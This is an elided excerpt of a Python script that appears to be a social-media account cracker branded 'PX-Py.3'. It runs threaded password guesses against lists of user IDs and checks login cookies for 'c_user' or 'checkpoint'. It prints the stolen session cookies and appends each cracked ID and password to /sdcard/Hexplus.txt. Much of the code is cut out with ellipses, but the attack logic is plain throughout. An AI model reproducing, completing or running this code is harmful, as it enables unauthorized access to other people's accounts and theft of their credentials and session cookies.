...
def fuck():
    ...
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] NASA SIM CODE : ')
    ...
    limit = int(input('[?] ENTER YOUR NASA CRACK LIMIT : '))
    ...
    with ThreadPool(max_workers=100) as turag:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME NASA ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY PX-Py.3 JOIN MY HOKER ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL NASA ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
    ...
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] NASA HOKER CRACK SUCCESSFULL..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            bi = random.choice([A,B,C,D,E,F,G,H,I,Q,R,T,Y,U,O,P,S,J,K,L,Z,V,N,M,X])
            sys.stdout.write(f'\r \033[1;31m[%sPX-Py.3[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[Py.3-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/Hexplus.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               #  print(f"\x1b[38;5;196m[Py.3-CP💔] {uid} • {ps}")
                open('/sdcard/Hexplus.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
